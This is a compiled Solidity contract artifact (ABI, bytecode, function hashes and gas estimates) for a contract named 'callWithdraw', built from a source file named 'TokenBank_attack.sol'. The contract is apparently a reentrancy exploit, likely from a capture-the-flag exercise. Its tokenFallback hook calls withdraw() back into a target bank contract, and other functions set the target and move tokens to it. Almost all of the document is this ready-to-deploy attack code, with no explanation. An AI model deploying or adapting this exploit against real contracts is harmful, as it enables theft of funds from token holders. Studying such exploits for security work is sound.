{
    "contractName": "callWithdraw",
    "abi": [
        {
            "constant": false,
            "inputs": [
                {
                    "name": "from",
                    "type": "address"
                },
                {
                    "name": "value",
                    "type": "uint256"
                }
            ],
            "name": "tokenFallback",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [],
            "name": "execute",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [
                {
                    "name": "_addr",
                    "type": "address"
                }
            ],
            "name": "initCodeToCall",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [
                {
                    "name": "tokenaddr",
                    "type": "address"
                },
                {
                    "name": "transferTo",
                    "type": "address"
                }
            ],
            "name": "transferToTokenBank",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ],
    "bytecode": "60606040526000805460ff19168155600155341561001c57600080fd5b6102948061002b6000396000f3006060604052600436106100485763ffffffff60e060020a6000350416633b66d02b811461004d5780636146195414610071578063bafe040e14610084578063cb01cd31146100a3575b600080fd5b341561005857600080fd5b61006f600160a060020a03600435166024356100c8565b005b341561007c57600080fd5b61006f61015a565b341561008f57600080fd5b61006f600160a060020a03600435166101be565b34156100ae57600080fd5b61006f600160a060020a03600435811690602435166101ed565b60015415806100d957506001546002145b156100eb576001805481019055610156565b6001805481019055600254600160a060020a0316632e1a7d4d6969e10de76676d080000060405160e060020a63ffffffff84160281526004810191909152602401600060405180830381600087803b151561014557600080fd5b5af1151561015257600080fd5b5050505b5050565b600254600160a060020a0316632e1a7d4d6969e10de76676d080000060405160e060020a63ffffffff84160281526004810191909152602401600060405180830381600087803b15156101ac57600080fd5b5af115156101b957600080fd5b505050565b6002805473ffffffffffffffffffffffffffffffffffffffff1916600160a060020a0392909216919091179055565b81600160a060020a03811663a9059cbb836969e10de76676d080000060405160e060020a63ffffffff8516028152600160a060020a0390921660048301526024820152604401602060405180830381600087803b151561024c57600080fd5b5af1151561025957600080fd5b505050604051805150505050505600a165627a7a7230582018c783b1cc8df3c7cdb9eaebdeed7bfc49fb58c7dbfcf8d99fc3dc3f48a5e2b20029",
    "sourcePath": "/Users/michaeldaly/github_projects/babys_first_repo/contracts/TokenBank_attack.sol",
    "compiler": {
        "name": "solc",
        "version": "0.4.21+commit.dfe3193c"
    },
    "functionHashes": {
        "execute()": "61461954",
        "initCodeToCall(address)": "bafe040e",
        "tokenFallback(address,uint256)": "3b66d02b",
        "transferToTokenBank(address,address)": "cb01cd31"
    },
    "gasEstimates": {
        "creation": {
            "codeDepositCost": "132000",
            "executionCost": "25393",
            "totalCost": "157393"
        },
        "external": {
            "execute()": "infinite",
            "initCodeToCall(address)": "20627",
            "tokenFallback(address,uint256)": "infinite",
            "transferToTokenBank(address,address)": "infinite"
        }
    }
}